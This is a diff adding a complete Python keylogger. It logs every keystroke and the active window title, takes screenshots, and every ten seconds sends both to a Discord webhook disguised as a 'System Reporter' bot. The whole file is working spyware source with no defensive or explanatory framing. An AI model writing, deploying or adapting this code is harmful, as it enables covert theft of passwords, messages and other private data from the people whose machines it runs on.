@@ -1,0 +1,94 @@
+import time
+import requests
+from pynput.keyboard import Key, Listener
+from threading import Thread
+import ctypes
+import io
+import pyscreenshot as ImageGrab
+
+DISCORD_WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE" 
+SEND_INTERVAL_SECONDS = 10 
+
+log_buffer = []
+last_window_title = ""
+
+def get_active_window_title():
+    try:
+        hWnd = ctypes.windll.user32.GetForegroundWindow()
+        length = ctypes.windll.user32.GetWindowTextLengthW(hWnd)
+        buffer = ctypes.create_unicode_buffer(length + 1)
+        ctypes.windll.user32.GetWindowTextW(hWnd, buffer, length + 1)
+        return buffer.value
+    except:
+        return ""
+
+def take_screenshot():
+    try:
+        im = ImageGrab.grab() 
+        img_bytes = io.BytesIO()
+        im.save(img_bytes, 'png')
+        img_bytes.seek(0)
+        return img_bytes.read()
+    except Exception:
+        return None
+
+def send_discord_message(log_message, screenshot_bytes):
+    payload = {
+        "content": f"```Log Report: {time.ctime()}```\n{log_message}",
+        "username": "System Reporter",
+        "avatar_url": "https://i.imgur.com/4M34hi2.png"
+    }
+    
+    files = {}
+    if screenshot_bytes:
+        files = {
+            'file': ('screenshot.png', screenshot_bytes, 'image/png')
+        }
+
+    try:
+        requests.post(DISCORD_WEBHOOK_URL, data=payload, files=files)
+    except requests.exceptions.RequestException:
+        pass
+
+def on_press(key):
+    global log_buffer, last_window_title
+    
+    current_title = get_active_window_title()
+    if current_title != last_window_title and current_title:
+        log_buffer.append(f"\n\n--- [WINDOW: {current_title}] ---\n")
+        last_window_title = current_title
+
+    try:
+        char = key.char
+    except AttributeError:
+        char = f" [{str(key).replace('Key.', '')}] "
+    
+    log_buffer.append(char)
+    
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+def report_logs():
+    global log_buffer
+    while True:
+        time.sleep(SEND_INTERVAL_SECONDS)
+        
+        if log_buffer:
+            log_message = "".join(log_buffer)
+            
+            if len(log_message) > 1950:
+                 log_message = log_message[:1950] + "\n... (Logs continued)"
+            
+            screenshot_data = take_screenshot()
+            send_discord_message(log_message, screenshot_data)
+            
+            log_buffer = []
+
+reporter_thread = Thread(target=report_logs)
+reporter_thread.daemon = True 
+reporter_thread.start()
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
